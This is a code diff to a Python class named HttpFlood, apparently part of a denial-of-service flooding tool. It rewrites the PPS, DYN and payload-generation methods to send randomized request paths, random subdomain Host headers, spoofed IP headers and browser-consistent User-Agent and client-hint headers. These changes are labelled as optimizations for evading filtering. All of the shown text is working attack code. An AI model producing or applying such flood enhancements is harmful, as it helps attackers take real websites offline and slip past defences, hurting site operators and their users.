@@ -1059,11 +1059,24 @@ class HttpFlood(Thread):
                 f'Real-IP: {spoof}\r\n')
 
     def generate_payload(self, other: str = None) -> bytes:
-        return str.encode((self._payload +
-                           f"Host: {self._target.authority}\r\n" +
-                           self.randHeadercontent +
-                           (other if other else "") +
-                           "\r\n"))
+        # [OPTIMIZED] Global Dynamic Path Injection
+        # Instead of using static self._payload, we rebuild it.
+        path = self.get_random_target_path()
+        request_line = f"{self._req_type} {path} HTTP/1.1\r\n"
+        
+        # We also need dynamic headers (UA, Mobile, Platform)
+        # Note: randHeadercontent uses a random UA but doesn't sync Sec-Ch-Ua
+        # For maximum quality, we should use build_consistent_headers here too.
+        ua = randchoice(self._useragents)
+        consistent_headers = self.build_consistent_headers(ua)
+        
+        return (f"{request_line}"
+                f"Host: {self._target.authority}\r\n"
+                f"User-Agent: {ua}\r\n"
+                f"{consistent_headers}"
+                f"Referer: {randchoice(self._referers)}\r\n"
+                f"{other if other else ''}"
+                "\r\n").encode("utf-8")
 
     def open_connection(self, host=None) -> socket:
         if self._proxies:
@@ -1193,12 +1206,13 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def PPS(self) -> None:
-        payload: Any = str.encode(self._defaultpayload +
-                                  f"Host: {self._target.authority}\r\n\r\n")
+        # [OPTIMIZED] Parsed Packet Storm (Dynamic)
+        # Replaces simple payload with dynamic generation
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                Tools.send(s, payload)
+                # Use Global Dynamic Generator
+                Tools.send(s, self.generate_payload())
         Tools.safe_close(s)
 
     def KILLER(self) -> None:
@@ -1327,10 +1341,22 @@ class HttpFlood(Thread):
             Tools.safe_close(ss)
 
     def DYN(self):
-        payload: Any = str.encode(self._payload +
-                                  f"Host: {ProxyTools.Random.rand_str(6)}.{self._target.authority}\r\n" +
-                                  self.randHeadercontent +
-                                  "\r\n")
+        # [OPTIMIZED] Dynamic Host + Dynamic Path
+        # Previous: Static path, Dynamic Host
+        # New: Random Path + Random Subdomain + Consistent Headers
+        path = self.get_random_target_path()
+        ua = randchoice(self._useragents)
+        headers = self.build_consistent_headers(ua)
+        
+        request_line = f"{self._req_type} {path} HTTP/1.1\r\n"
+        # Dynamic Subdomain Host
+        host_header = f"Host: {ProxyTools.Random.rand_str(6)}.{self._target.authority}\r\n"
+        
+        payload: Any = (f"{request_line}"
+                        f"{host_header}"
+                        f"User-Agent: {ua}\r\n"
+                        f"{headers}"
+                        "\r\n").encode("utf-8")
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
